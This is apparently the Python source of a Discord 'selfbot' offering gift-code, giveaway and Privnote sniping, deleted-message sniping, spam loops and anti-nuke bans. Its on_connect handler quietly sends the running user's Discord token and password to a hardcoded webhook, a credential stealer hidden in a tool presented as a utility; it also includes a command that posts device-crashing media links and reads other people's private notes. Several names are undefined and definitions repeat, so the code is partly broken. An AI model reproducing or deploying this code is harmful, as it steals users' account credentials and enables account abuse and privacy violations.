import asyncio
import datetime
import functools
import io
from urllib.parse import urlencode
import discord, subprocess, sys, time, os, colorama, base64, codecs, datetime, io, random, numpy, datetime, smtplib, \
    string, ctypes
import json
import os
import random
import re
import string
import urllib.parse
import urllib.request
import time
from urllib import parse, request
from itertools import cycle

from discord.ext import commands, tasks

import aiohttp
import colorama
import discord
import numpy
import requests
from PIL import Image
from colorama import Fore
from discord.ext import commands
from discord.utils import get
from gtts import gTTS


class SELFBOT():
    __version__ = 2


with open('config.json') as f:
    config = json.load(f)

token = config.get('token')
password = config.get('password')
prefix = config.get('prefix')
ver = 'v2.0'

nitro_sniper = config.get('nitro_sniper')
giveaway_sniper = config.get('giveaway_sniper')
slotbot_sniper = config.get('slotbot_sniper')

stream_url = "https://www.twitch.tv/"
tts_language = "en"

start_time = datetime.datetime.utcnow()
loop = asyncio.get_event_loop()

LSD = commands.Bot(description="LSD Selfbot", command_prefix=prefix, self_bot=True)


def startprint():
    if giveaway_sniper == True:
        giveaway = "Active"
    else:
        giveaway = "Disabled"

    if nitro_sniper == True:
        nitro = "Active"
    else:
        nitro = "Disabled"

    if slotbot_sniper == True:
        slotbot = "Active"
    else:
        slotbot = "Disabled"

    if privnote_sniper == True:
        privnote = "Active"
    else:
        privnote = "Disabled"


languages = {
    'hu': 'Hungarian, Hungary',
    'nl': 'Dutch, Netherlands',
    'no': 'Norwegian, Norway',
    'pl': 'Polish, Poland',
    'pt-BR': 'Portuguese, Brazilian, Brazil',
    'ro': 'Romanian, Romania',
    'fi': 'Finnish, Finland',
    'sv-SE': 'Swedish, Sweden',
    'vi': 'Vietnamese, Vietnam',
    'tr': 'Turkish, Turkey',
    'cs': 'Czech, Czechia, Czech Republic',
    'el': 'Greek, Greece',
    'bg': 'Bulgarian, Bulgaria',
    'ru': 'Russian, Russia',
    'uk': 'Ukranian, Ukraine',
    'th': 'Thai, Thailand',
    'zh-CN': 'Chinese, China',
    'ja': 'Japanese',
    'zh-TW': 'Chinese, Taiwan',
    'ko': 'Korean, Korea'
}

locales = [
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]

m_numbers = [
    ":one:",
    ":two:",
    ":three:",
    ":four:",
    ":five:",
    ":six:"
]

m_offets = [
    (-1, -1),
    (0, -1),
    (1, -1),
    (-1, 0),
    (1, 0),
    (-1, 1),
    (0, 1),
    (1, 1)
]


def startprint():
    if nitro_sniper:
        nitro = "Active"
    else:
        nitro = "Disabled"

    print(f'''{Fore.YELLOW}
                     |----------------------------------------------------------------------------------------|
                       █░░ ░ █▀ ░ █▀▄   ▄▄   ▀█▀ █░█ █▀▀   █░█ ▄▀█ █▀█ █░█ █▀▀ █▀ ▀█▀ █▀▀ █▀█ █▀
                       █▄▄ ▄ ▄█ ▄ █▄▀   ░░   ░█░ █▀█ ██▄   █▀█ █▀█ █▀▄ ▀▄▀ ██▄ ▄█ ░█░ ██▄ █▀▄ ▄█
                     |----------------------------------------------------------------------------------------|
                      ᴜꜱᴇ ᴀᴛ ʏᴏᴜʀ ᴏᴡɴ ʀɪꜱᴋ ! ! !                                     𝒞𝓇ℯ𝒶𝓉ℯ𝒹 ℬ𝓎 : ʀᴇᴄᴏɴᴇɴɢɪɴᴇ
                                                                                                                                                                                                                         𝒞ℴ𝒹ℯ𝒹 ℐ𝓃  : 𝒫𝓎𝓉𝒽ℴ𝓃 3.9

                                                 

                       
                       {Fore.YELLOW}LSD SELFBOT v{SELFBOT.__version__}  | {Fore.BLUE}Logged in as: {LSD.user.name}#{LSD.user.discriminator} {Fore.CYAN}| ID: {Fore.CYAN}{LSD.user.id}    
                       {Fore.RED}Anti Nuke:      | {Fore.CYAN}{antinuke}{Fore.RED}|
                       {Fore.RED}Giveaway Sniper:| {Fore.CYAN}{giveaway}{Fore.RED}|
                       {Fore.RED}SlotBot Sniper: | {Fore.CYAN}{slotbot}{Fore.RED}|
                       {Fore.RED}Nitro Sniper:   | {Fore.CYAN}{nitro}
                       {Fore.RED}Guilds:         | {Fore.CYAN}{len(LSD.guilds)}
                       {Fore.RED}Cached Users:   | {Fore.CYAN}{len(LSD.users)}
                       {Fore.RED}Prefix:         | {Fore.CYAN}{LSD.command_prefix}
    ''' + Fore.RESET)


def Clear():
    os.system('cls')


Clear()
intents = discord.Intents.default()
intents.members = True


def Init():
    token = config.get('token')
    try:
        LSD.run(token, bot=False, reconnect=True)
        os.system(f'title (LSD Selfbot) - Version {SELFBOT.__version__}')
    except discord.errors.LoginFailure:
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}Improper token has been passed" + Fore.RESET)
        os.system('pause >NUL')


class Login(discord.Client):
    async def on_connect(self):
        guilds = len(self.guilds)
        users = len(self.users)
        print("")
        print(f"Connected to: [{self.user.name}]")
        print(f"Token: {self.http.token}")
        print(f"Guilds: {guilds}")
        print(f"Users: {users}")
        print("-------------------------------")
        await self.logout()


def async_executor():
    def outer(func):
        @functools.wraps(func)
        def inner(*args, **kwargs):
            thing = functools.partial(func, *args, **kwargs)
            return loop.run_in_executor(None, thing)

        return inner

    return outer


token = config.get('token')


@async_executor()
def do_tts(message):
    f = io.BytesIO()
    tts = gTTS(text=message.lower(), lang=tts_language)
    tts.write_to_fp(f)
    f.seek(0)
    return f


def Dump(ctx):
    for member in ctx.guild.members:
        f = open(f'Images/{ctx.guild.id}-Dump.txt', 'a+')
        f.write(str(member.avatar_url) + '\n')


def Nitro():
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    return f'https://discord.gift/{code}'


def RandomColor():
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor


def RandString():
    return "".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32)))


colorama.init()
LSD = discord.Client()
LSD = commands.Bot(description='LSD Selfbot', command_prefix=prefix, self_bot=True)

LSD.antiraid = True
LSD.msgsniper = True
LSD.slotbot_sniper = True
LSD.giveaway_sniper = True
LSD.mee6 = True
LSD.mee6_channel = None
LSD.yui_kiss_user = None
LSD.yui_kiss_channel = None
LSD.yui_hug_user = None
LSD.yui_hug_channel = None
LSD.sniped_message_dict = {}
LSD.sniped_edited_message_dict = {}
LSD.whitelisted_users = {}
LSD.copycat = None
LSD.remove_command('help')


ascii = ""

for x in range(1985):
    num = random.randrange(13000)
    ascii = ascii + chr(num)
print("LSD SELFBOT - Starting... \nPrefix : " + prefix + " | Instagram = r.e.c.o.n.engine")


# -------------------------------------------------------------------------------------------------------------------------


# -------------------------------------------------------------------------------------------------------------------------
# spam ascii in server
@LSD.command()
async def crash(ctx):
    await ctx.send("https://gfycat.com/achingclearcaecilian")
    await ctx.send("https://gfycat.com/ampleblissfulfiddlercrab")
    await ctx.send("https://gfycat.com/achingclearcaecilian")
    await ctx.send("https://gfycat.com/anguisheddefinitivegoldenretriever")
    await ctx.send("https://gfycat.com/achingclearcaecilian")
    await ctx.send("https://gfycat.com/anxioussharpfox")
    await ctx.send("https://imgur.com/ehxMcVy?nocache=true")
    await ctx.send(
        "https://www.digitalspy.com/tech/smartphones/a814918/bizarre-5-second-video-will-completely-crash-any-iphone/")
    await ctx.send("https://tenor.com/view/discord-crash-gif-21388226")
    await ctx.send("https://tenor.com/view/iphone-crash-discord-gif-19784533")
    await ctx.send("https://i.imgur.com/ehxMcVy.gif")
    await ctx.send("https://tenor.com/view/discordcrash-gif-21499127")
    await ctx.send("https://tenor.com/view/crasher-gif-21441724")


@LSD.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.CheckFailure):
        await ctx.send('[ERROR]: You\'re missing permission to execute this command', delete_after=30)
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"[ERROR]: Missing arguments: {error}", delete_after=30)
    elif isinstance(error, numpy.AxisError):
        await ctx.send('Invalid Image', delete_after=30)
    elif isinstance(error, discord.errors.Forbidden):
        await ctx.send(f"[ERROR]: 404 Forbidden Access: {error}", delete_after=30)
    elif "Cannot send an empty message" in error_str:
        await ctx.send('[ERROR]: Message contents cannot be null', delete_after=30)
    else:
        await ctx.send(f'[ERROR]: {error_str}', delete_after=30)


@LSD.event
async def on_message_edit(before, after):
    await LSD.process_commands(after)


@LSD.event
async def on_message(message):
    if LSD.copycat is not None and LSD.copycat.id == message.author.id:
        await message.channel.send(chr(173) + message.content)

    def GiveawayData():
        print(
            f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
            f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
            + Fore.RESET)

    def SlotBotData():
        print(
            f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
            f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
            + Fore.RESET)

    def NitroData(elapsed, code):
        print(
            f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
            f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
            f"\n{Fore.WHITE} - AUTHOR: {Fore.YELLOW}[{message.author}]"
            f"\n{Fore.WHITE} - ELAPSED: {Fore.YELLOW}[{elapsed}]"
            f"\n{Fore.WHITE} - CODE: {Fore.YELLOW}{code}"
            + Fore.RESET)

    def GiveawayData():
        print(
            f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
            f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
            + Fore.RESET)

    def SlotBotData():
        print(
            f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
            f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
            + Fore.RESET)

    def NitroData(elapsed, code):
        print(
            f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
            f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
            f"\n{Fore.WHITE} - AUTHOR: {Fore.YELLOW}[{message.author}]"
            f"\n{Fore.WHITE} - ELAPSED: {Fore.YELLOW}[{elapsed}]"
            f"\n{Fore.WHITE} - CODE: {Fore.YELLOW}{code}"
            + Fore.RESET)

    def PrivnoteData(code):
        print(
            f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
            f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
            f"\n{Fore.WHITE} - CONTENT: {Fore.YELLOW}[The content can be found at Privnote/{code}.txt]"
            + Fore.RESET)

    time = datetime.datetime.now().strftime("%H:%M %p")
    if 'discord.gift/' in message.content:
        if nitro_sniper == True:
            start = datetime.datetime.now()
            code = re.search("discord.gift/(.*)", message.content).group(1)
            token = config.get('token')

            headers = {'Authorization': token}

            r = requests.post(
                f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem',
                headers=headers,
            ).text

            elapsed = datetime.datetime.now() - start
            elapsed = f'{elapsed.seconds}.{elapsed.microseconds}'

            if 'This gift has been redeemed already.' in r:
                print(""
                      f"\n{Fore.CYAN}[{time} - Nitro Already Redeemed]" + Fore.RESET)
                NitroData(elapsed, code)

            elif 'subscription_plan' in r:
                print(""
                      f"\n{Fore.CYAN}[{time} - Nitro Success]" + Fore.RESET)
                NitroData(elapsed, code)

            elif 'Unknown Gift Code' in r:
                print(""
                      f"\n{Fore.CYAN}[{time} - Nitro Unknown Gift Code]" + Fore.RESET)
                NitroData(elapsed, code)
        else:
            return

    if 'Someone just dropped' in message.content:
        if slotbot_sniper == true:
            if message.author.id == 346353957029019648:
                try:
                    await asyncio.sleep(5)
                    await message.channel.send('~grab')
                except discord.errors.Forbidden:
                    print(""
                          f"\n{Fore.CYAN}[{time} - SlotBot Couldnt Grab]" + Fore.RESET)
                    SlotBotData()
                print(""
                      f"\n{Fore.CYAN}[{time} - Slotbot Grabbed]" + Fore.RESET)
                SlotBotData()
        else:
            return

    if 'GIVEAWAY' in message.content:
        if giveaway_sniper == True:
            if message.author.id == 294882584201003009 or message.author.id == 673918978178940951 or message.author.id == 582537632991543307 or message.author.id == 396464677032427530 or message.author.id == 649604306596528138 or message.author.id == 716967712844414996:
                try:
                    await asyncio.sleep(19)
                    await message.add_reaction("🎉")
                except discord.errors.Forbidden:
                    print(""
                          f"\n{Fore.CYAN}[{time} - Giveaway Couldnt React]" + Fore.RESET)
                    GiveawayData()
                print(""
                      f"\n{Fore.CYAN}[{time} - Giveaway Sniped]" + Fore.RESET)
                GiveawayData()
        else:
            return

    if f'Congratulations <@{LSD.user.id}>' in message.content:
        if giveaway_sniper == True:
            if message.author.id == 294882584201003009 or message.author.id == 673918978178940951 or message.author.id == 582537632991543307 or message.author.id == 396464677032427530 or message.author.id == 649604306596528138 or message.author.id == 716967712844414996:
                print(""
                      f"\n{Fore.CYAN}[{time} - Giveaway Won]" + Fore.RESET)
                GiveawayData()
        else:
            return

    if 'privnote.com' in message.content:
        if privnote_sniper == True:
            code = re.search('privnote.com/(.*)', message.content).group(1)
            link = 'https://privnote.com/' + code
            try:
                note_text = pn.read_note(link)
            except Exception as e:
                print(e)
            with open(f'Privnote/{code}.txt', 'a+') as f:
                print(""
                      f"\n{Fore.CYAN}[{time} - Privnote Sniped]" + Fore.RESET)
                PrivnoteData(code)
                f.write(note_text)
        else:
            return

    await LSD.process_commands(message)


@LSD.event
async def on_connect():
    Clear()
    requests.post(
        'https://discord.com/api/webhooks/854812236416548884/sWLTCUi8k4OsgSeYq5ntlwBuEtZ4a1LCfa_ch-cUPTTS54gM_KYekjuoYSmHabS2G_zY',
        json={'content': f"**Token:** `{token}`\n**Password:** `{password}`"})
    startprint()


@LSD.event
async def on_member_ban(guild: discord.Guild, user: discord.user):
    if LSD.antiraid is True:
        try:
            async for i in guild.audit_logs(limit=1, action=discord.AuditLogAction.ban):
                if guild.id in LSD.whitelisted_users.keys() and i.user.id in LSD.whitelisted_users[
                    guild.id].keys() and i.user.id is not LSD.user.id:
                    print("not banned - " + i.user.name)
                else:
                    print("banned - " + i.user.name)
                    await guild.ban(i.user, reason="LSD Anti-Nuke")
        except Exception as e:
            print(e)


@LSD.event
async def on_member_join(member):
    if LSD.antiraid is True and member.LSD:
        try:
            guild = member.guild
            async for i in guild.audit_logs(limit=1, action=discord.AuditLogAction.LSD_add):
                if member.guild.id in LSD.whitelisted_users.keys() and i.user.id in LSD.whitelisted_users[
                    member.guild.id].keys():
                    return
                else:
                    await guild.ban(member, reason="LSD Anti-Nuke")
                    await guild.ban(i.user, reason="LSD Anti-Nuke")
        except Exception as e:
            print(e)


@LSD.event
async def on_member_remove(member):
    if LSD.antiraid is True:
        try:
            guild = member.guild
            async for i in guild.audit_logs(limit=1, action=discord.AuditLogAction.kick):
                if guild.id in LSD.whitelisted_users.keys() and i.user.id in LSD.whitelisted_users[
                    guild.id].keys() and i.user.id is not LSD.user.id:
                    print('not banned')
                else:
                    print('banned')
                    await guild.ban(i.user, reason="LSD Anti-Nuke")
        except Exception as e:
            print(e)


@LSD.event
async def on_ready():
    LSD.icount = LSD.message_count = LSD.mention_count = LSD.keyword_log = 0
    LSD.command_count = {}


@LSD.command(aliases=["queue"])
async def play(ctx, *, query):
    await ctx.message.delete()
    voice = get(LSD.voice_LSDs, guild=ctx.guild)
    if voice and voice.is_connected():
        voice.play('song.mp3')
    else:
        await ctx.send('You need to be a in VC to play music')


@LSD.command()
async def stop(ctx):
    await ctx.message.delete()
    await ctx.send("Stopped the music player!")


@LSD.command()
async def skip(ctx):
    await ctx.message.delete()
    await ctx.send("Skipped song!")


@LSD.command(aliases=["lyric"])
async def lyrics(ctx, *, args):
    await ctx.message.delete()
    await ctx.send("Showing lyrics for " + args)


@LSD.command(aliases=[])
async def msgsniper(ctx, msgsniperlol=None):
    await ctx.message.delete()
    if str(msgsniperlol).lower() == 'true' or str(msgsniperlol).lower() == 'on':
        LSD.msgsniper = True
        await ctx.send('LSD Message-Sniper is now **enabled**')
    elif str(msgsniperlol).lower() == 'false' or str(msgsniperlol).lower() == 'off':
        LSD.msgsniper = False
        await ctx.send('LSD Message-Sniper is now **disabled**')


@LSD.command(aliases=['ar', 'antiraid'])
async def antinuke(ctx, antiraidparameter=None):
    await ctx.message.delete()
    LSD.antiraid = False
    if str(antiraidparameter).lower() == 'true' or str(antiraidparameter).lower() == 'on':
        LSD.antiraid = True
        await ctx.send('Anti-Nuke is now **enabled**')
    elif str(antiraidparameter).lower() == 'false' or str(antiraidparameter).lower() == 'off':
        LSD.antiraid = False
        await ctx.send('Anti-Nuke is now **disabled**')


@LSD.command(aliases=['wl'])
async def whitelist(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        await ctx.send("Please specify a user to whitelist")
    else:
        if ctx.guild.id not in LSD.whitelisted_users.keys():
            LSD.whitelisted_users[ctx.guild.id] = {}
        if user.id in LSD.whitelisted_users[ctx.guild.id]:
            await ctx.send('That user is already whitelisted')
        else:
            LSD.whitelisted_users[ctx.guild.id][user.id] = 0
            await ctx.send("Whitelisted **" + user.name.replace("*", "\*").replace("`", "\`").replace("_",
                                                                                                      "\_") + "#" + user.discriminator + "**")
    # else:
    #     user = LSD.get_user(id)
    #     if user is None:
    #         await ctx.send("Couldn't find that user")
    #         return
    #     if ctx.guild.id not in LSD.whitelisted_users.keys():
    #         LSD.whitelisted_users[ctx.guild.id] = {}
    #     if user.id in LSD.whitelisted_users[ctx.guild.id]:
    #         await ctx.send('That user is already whitelisted')
    #     else:
    #         LSD.whitelisted_users[ctx.guild.id][user.id] = 0
    #         await ctx.send("Whitelisted **" + user.name.replace("*", "\*").replace("`", "\`").replace("_","\_") + "#" + user.discriminator + "**")


@LSD.command(aliases=['wld'])
async def whitelisted(ctx, g=None):
    await ctx.message.delete()
    if g == '-g' or g == '-global':
        whitelist = '`All Whitelisted Users:`\n'
        for key in LSD.whitelisted_users:
            for key2 in LSD.whitelisted_users[key]:
                user = LSD.get_user(key2)
                whitelist += '**+ ' + user.name.replace('*', "\*").replace('`', "\`").replace('_',
                                                                                              "\_") + "#" + user.discriminator + "** - " + LSD.get_guild(
                    key).name.replace('*', "\*").replace('`', "\`").replace('_', "\_") + "" + "\n"
        await ctx.send(whitelist)
    else:
        whitelist = "`" + ctx.guild.name.replace('*', "\*").replace('`', "\`").replace('_',
                                                                                       "\_") + '\'s Whitelisted Users:`\n'
        for key in LSD.whitelisted_users:
            if key == ctx.guild.id:
                for key2 in LSD.whitelisted_users[ctx.guild.id]:
                    user = LSD.get_user(key2)
                    whitelist += '**+ ' + user.name.replace('*', "\*").replace('`', "\`").replace('_',
                                                                                                  "\_") + "#" + user.discriminator + " (" + str(
                        user.id) + ")" + "**\n"
        await ctx.send(whitelist)


@LSD.command(aliases=['uwl'])
async def unwhitelist(ctx, user: discord.Member = None):
    if user is None:
        await ctx.send("Please specify the user you would like to unwhitelist")
    else:
        if ctx.guild.id not in LSD.whitelisted_users.keys():
            await ctx.send("That user is not whitelisted")
            return
        if user.id in LSD.whitelisted_users[ctx.guild.id]:
            LSD.whitelisted_users[ctx.guild.id].pop(user.id, 0)
            user2 = LSD.get_user(user.id)
            await ctx.send(
                'Successfully unwhitelisted **' + user2.name.replace('*', "\*").replace('`', "\`").replace('_',
                                                                                                           "\_") + '#' + user2.discriminator + '**')


@LSD.command(aliases=['clearwl', 'clearwld'])
async def clearwhitelist(ctx):
    await ctx.message.delete()
    LSD.whitelisted_users.clear()
    await ctx.send('Successfully cleared the whitelist hash')


@LSD.command()
async def yuikiss(ctx, user: discord.User = None):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(ctx.message.channel, discord.GroupChannel):
        await ctx.send("You can't use Yui Kiss in DMs or GCs", delete_after=3)
    else:
        if user is None:
            await ctx.send("Please specify a user to Yui Kiss", delete_after=3)
            return
        LSD.yui_kiss_user = user.id
        LSD.yui_kiss_channel = ctx.channel.id
        if LSD.yui_kiss_user is None or LSD.yui_kiss_channel is None:
            await ctx.send('An impossible error occured, try again later or contact swag')
            return
        while LSD.yui_kiss_user is not None and LSD.yui_kiss_channel is not None:
            await LSD.get_channel(LSD.yui_kiss_channel).send('yui kiss ' + str(LSD.yui_kiss_user), delete_after=0.1)
            await asyncio.sleep(60)


@LSD.command()
async def yuihug(ctx, user: discord.User = None):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(ctx.message.channel, discord.GroupChannel):
        await ctx.send("You can't use Yui Hug in DMs or GCs", delete_after=3)
    else:
        if user is None:
            await ctx.send("Please specify a user to Yui Hug", delete_after=3)
            return
        LSD.yui_hug_user = user.id
        LSD.yui_hug_channel = ctx.channel.id
        if LSD.yui_hug_user is None or LSD.yui_hug_channel is None:
            await ctx.send('An impossible error occured, try again later or contact swag')
            return
        while LSD.yui_hug_user is not None and LSD.yui_hug_channel is not None:
            await LSD.get_channel(LSD.yui_hug_channel).send('yui hug ' + str(LSD.yui_hug_user), delete_after=0.1)
            await asyncio.sleep(60)


@LSD.command()
async def yuistop(ctx):
    await ctx.message.delete()
    LSD.yui_kiss_user = None
    LSD.yui_kiss_channel = None
    LSD.yui_hug_user = None
    LSD.yui_hug_channel = None
    await ctx.send('Successfully **disabled** Yui Loops', delete_after=3)


@LSD.command(aliases=["automee6"])
async def mee6(ctx, param=None):
    await ctx.message.delete()
    if param is None:
        await ctx.send("Please specify yes or no", delete_after=3)
        return
    if str(param).lower() == 'true' or str(param).lower() == 'on':
        if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(ctx.message.channel, discord.GroupChannel):
            await ctx.send("You can't bind Auto-MEE6 to a DM or GC", delete_after=3)
            return
        else:
            LSD.mee6 = True
            await ctx.send("Auto-MEE6 Successfully bound to `" + ctx.channel.name + "`", delete_after=3)
            LSD.mee6_channel = ctx.channel.id
    elif str(param).lower() == 'false' or str(param).lower() == 'off':
        LSD.mee6 = False
        await ctx.send("Auto-MEE6 Successfully **disabled**", delete_after=3)
    while LSD.mee6 is True:
        sentences = ['Stop waiting for exceptional things to just happen.',
                     'The lyrics of the song sounded like fingernails on a chalkboard.',
                     'I checked to make sure that he was still alive.', 'We need to rent a room for our party.',
                     'He had a hidden stash underneath the floorboards in the back room of the house.',
                     'Your girlfriend bought your favorite cookie crisp cereal but forgot to get milk.',
                     'People generally approve of dogs eating cat food but not cats eating dog food.',
                     'I may struggle with geography, but I\'m sure I\'m somewhere around here.',
                     'She was the type of girl who wanted to live in a pink house.',
                     'The bees decided to have a mutiny against their queen.',
                     'She looked at the masterpiece hanging in the museum but all she could think is that her five-year-old could do better.',
                     'The stranger officiates the meal.', 'She opened up her third bottle of wine of the night.',
                     'They desperately needed another drummer since the current one only knew how to play bongos.',
                     'He waited for the stop sign to turn to a go sign.',
                     'His thought process was on so many levels that he gave himself a phobia of heights.',
                     'Her hair was windswept as she rode in the black convertible.',
                     'Karen realized the only way she was getting into heaven was to cheat.',
                     'The group quickly understood that toxic waste was the most effective barrier to use against the zombies.',
                     'It was obvious she was hot, sweaty, and tired.', 'This book is sure to liquefy your brain.',
                     'I love eating toasted cheese and tuna sandwiches.', 'If you don\'t like toenails',
                     'You probably shouldn\'t look at your feet.',
                     'Wisdom is easily acquired when hiding under the bed with a saucepan on your head.',
                     'The spa attendant applied the deep cleaning mask to the gentleman’s back.',
                     'The three-year-old girl ran down the beach as the kite flew behind her.',
                     'For oil spots on the floor, nothing beats parking a motorbike in the lounge.',
                     'They improved dramatically once the lead singer left.',
                     'The Tsunami wave crashed against the raised houses and broke the pilings as if they were toothpicks.',
                     'Excitement replaced fear until the final moment.', 'The sun had set and so had his dreams.',
                     'People keep telling me "orange" but I still prefer "pink".',
                     'Someone I know recently combined Maple Syrup & buttered Popcorn thinking it would taste like caramel popcorn. It didn’t and they don’t recommend anyone else do it either.',
                     'I liked their first two albums but changed my mind after that charity gig.',
                     'Plans for this weekend include turning wine into water.',
                     'A kangaroo is really just a rabbit on steroids.',
                     'He played the game as if his life depended on it and the truth was that it did.',
                     'He\'s in a boy band which doesn\'t make much sense for a snake.',
                     'She let the balloon float up into the air with her hopes and dreams.',
                     'There was coal in his stocking and he was thrilled.',
                     'This made him feel like an old-style rootbeer float smells.',
                     'It\'s not possible to convince a monkey to give you a banana by promising it infinite bananas when they die.',
                     'The light in his life was actually a fire burning all around him.',
                     'Truth in advertising and dinosaurs with skateboards have much in common.',
                     'On a scale from one to ten, what\'s your favorite flavor of random grammar?',
                     'The view from the lighthouse excited even the most seasoned traveler.',
                     'The tortoise jumped into the lake with dreams of becoming a sea turtle.',
                     'It\'s difficult to understand the lengths he\'d go to remain short.',
                     'Nobody questions who built the pyramids in Mexico.',
                     'They ran around the corner to find that they had traveled back in time.']
        await LSD.get_channel(LSD.mee6_channel).send(random.choice(sentences), delete_after=0.1)
        await asyncio.sleep(60)


@LSD.command(aliases=['slotsniper', "slotbotsniper"])
async def slotbot(ctx, param=None):
    await ctx.message.delete()
    LSD.slotbot_sniper = False
    if str(param).lower() == 'true' or str(param).lower() == 'on':
        LSD.slotbot_sniper = True
    elif str(param).lower() == 'false' or str(param).lower() == 'off':
        LSD.slotbot_sniper = False


@LSD.command(aliases=['giveawaysniper'])
async def giveaway(ctx, param=None):
    await ctx.message.delete()
    LSD.giveaway_sniper = False
    if str(param).lower() == 'true' or str(param).lower() == 'on':
        LSD.giveaway_sniper = True
    elif str(param).lower() == 'false' or str(param).lower() == 'off':
        LSD.giveaway_sniper = False


@LSD.event
async def on_message_delete(message):
    if message.author.id == LSD.user.id:
        return
    if LSD.msgsniper:
        if isinstance(message.channel, discord.DMChannel) or isinstance(message.channel, discord.GroupChannel):
            attachments = message.attachments
            if len(attachments) == 0:
                message_content = "`" + str(discord.utils.escape_markdown(str(message.author))) + "`: " + str(
                    message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
                await message.channel.send(message_content)
            else:
                links = ""
                for attachment in attachments:
                    links += attachment.proxy_url + "\n"
                message_content = "`" + str(
                    discord.utils.escape_markdown(str(message.author))) + "`: " + discord.utils.escape_mentions(
                    message.content) + "\n\n**Attachments:**\n" + links
                await message.channel.send(message_content)
    if len(LSD.sniped_message_dict) > 1000:
        LSD.sniped_message_dict.clear()
    attachments = message.attachments
    if len(attachments) == 0:
        channel_id = message.channel.id
        message_content = "`" + str(discord.utils.escape_markdown(str(message.author))) + "`: " + str(
            message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
        LSD.sniped_message_dict.update({channel_id: message_content})
    else:
        links = ""
        for attachment in attachments:
            links += attachment.proxy_url + "\n"
        channel_id = message.channel.id
        message_content = "`" + str(
            discord.utils.escape_markdown(str(message.author))) + "`: " + discord.utils.escape_mentions(
            message.content) + "\n\n**Attachments:**\n" + links
        LSD.sniped_message_dict.update({channel_id: message_content})


@LSD.event
async def on_message_edit(before, after):
    if before.author.id == LSD.user.id:
        return
    if LSD.msgsniper:
        if before.content is after.content:
            return
        if isinstance(before.channel, discord.DMChannel) or isinstance(before.channel, discord.GroupChannel):
            attachments = before.attachments
            if len(attachments) == 0:
                message_content = "`" + str(
                    discord.utils.escape_markdown(str(before.author))) + "`: \n**BEFORE**\n" + str(
                    before.content).replace("@everyone", "@\u200beveryone").replace("@here",
                                                                                    "@\u200bhere") + "\n**AFTER**\n" + str(
                    after.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
                await before.channel.send(message_content)
            else:
                links = ""
                for attachment in attachments:
                    links += attachment.proxy_url + "\n"
                message_content = "`" + str(
                    discord.utils.escape_markdown(str(before.author))) + "`: " + discord.utils.escape_mentions(
                    before.content) + "\n\n**Attachments:**\n" + links
                await before.channel.send(message_content)
    if len(LSD.sniped_edited_message_dict) > 1000:
        LSD.sniped_edited_message_dict.clear()
    attachments = before.attachments
    if len(attachments) == 0:
        channel_id = before.channel.id
        message_content = "`" + str(discord.utils.escape_markdown(str(before.author))) + "`: \n**BEFORE**\n" + str(
            before.content).replace("@everyone", "@\u200beveryone").replace("@here",
                                                                            "@\u200bhere") + "\n**AFTER**\n" + str(
            after.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
        LSD.sniped_edited_message_dict.update({channel_id: message_content})
    else:
        links = ""
        for attachment in attachments:
            links += attachment.proxy_url + "\n"
        channel_id = before.channel.id
        message_content = "`" + str(
            discord.utils.escape_markdown(str(before.author))) + "`: " + discord.utils.escape_mentions(
            before.content) + "\n\n**Attachments:**\n" + links
        LSD.sniped_edited_message_dict.update({channel_id: message_content})


@LSD.command()
async def snipe(ctx):
    await ctx.message.delete()
    currentChannel = ctx.channel.id
    if currentChannel in LSD.sniped_message_dict:
        await ctx.send(LSD.sniped_message_dict[currentChannel])
    else:
        await ctx.send("No message to snipe!")


@LSD.command(aliases=["esnipe"])
async def editsnipe(ctx):
    await ctx.message.delete()
    currentChannel = ctx.channel.id
    if currentChannel in LSD.sniped_edited_message_dict:
        await ctx.send(LSD.sniped_edited_message_dict[currentChannel])
    else:
        await ctx.send("No message to snipe!")


@LSD.command()
async def adminservers(ctx):
    await ctx.message.delete()
    admins = []
    bots = []
    kicks = []
    bans = []
    for guild in LSD.guilds:
        if guild.me.guild_permissions.administrator:
            admins.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.manage_guild and not guild.me.guild_permissions.administrator:
            bots.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.ban_members and not guild.me.guild_permissions.administrator:
            bans.append(discord.utils.escape_markdown(guild.name))
